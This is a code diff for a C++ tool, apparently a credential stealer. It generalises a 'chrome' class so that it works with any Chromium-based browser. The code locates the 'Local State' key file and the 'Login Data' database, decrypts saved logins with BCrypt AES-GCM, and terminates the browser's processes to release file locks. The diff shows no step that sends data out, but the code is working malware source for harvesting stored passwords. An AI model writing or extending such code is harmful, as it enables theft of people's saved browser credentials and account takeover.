@@ -10,21 +10,24 @@
 #include <wil/resource.h>
 #include <nlohmann/json.hpp>
 
-chrome::chrome() { }
+chrome::chrome(std::string proc_name, std::filesystem::path key_path, std::filesystem::path logins_path)
+    : m_proc_name(proc_name)
+    , m_key_path(key_path)
+    , m_logins_path(logins_path) { }
 
-std::string chrome::get_name(void) const {
-    return "Google Chrome";
+std::unique_ptr<chrome> chrome::construct(std::string proc_name, std::filesystem::path path) {
+    namespace fs = std::filesystem;
+    fs::path key = path / "Local State";
+    fs::path logins = path / "Default" / "Login Data";
+
+    if (fs::exists(key) && fs::exists(logins)) {
+        return std::unique_ptr<chrome>(new chrome(proc_name, key, logins));
+    } else {
+        return nullptr;
+    }
 }
 
 std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
-    std::filesystem::path base_path = get_base_path();
-    m_key_path = base_path / "Local State";
-    m_logins_path = base_path / "Default" / "Login Data";
-
-    if (!(std::filesystem::exists(m_key_path) && std::filesystem::exists(m_logins_path))) {
-        return std::unexpected(browser_error::file_not_found);
-    }
-
     if (BCryptOpenAlgorithmProvider(&m_aes_alg, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS) {
         return std::unexpected(browser_error::bcrypt_error);
     }
@@ -32,7 +35,7 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
     BCryptSetProperty(m_aes_alg.get(), BCRYPT_CHAINING_MODE,
                       (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
 
-    // kill chrome processes to free file locks
+    // kill processes to free file locks
     kill();
 
     std::ifstream key_file(m_key_path);
@@ -149,10 +152,6 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
     return logins;
 }
 
-std::filesystem::path chrome::get_base_path(void) {
-    return find_folder(FOLDERID_LocalAppData) / "Google" / "Chrome" / "User Data";
-}
-
 void chrome::kill(void) {
     PROCESSENTRY32W entry;
     entry.dwSize = sizeof(PROCESSENTRY32W);
@@ -162,7 +161,7 @@ void chrome::kill(void) {
         return;
     }
     do {
-        if (narrow(entry.szExeFile) == "chrome.exe") {
+        if (narrow(entry.szExeFile) == m_proc_name) {
             wil::unique_handle process(
                 OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID));
             if (process) {
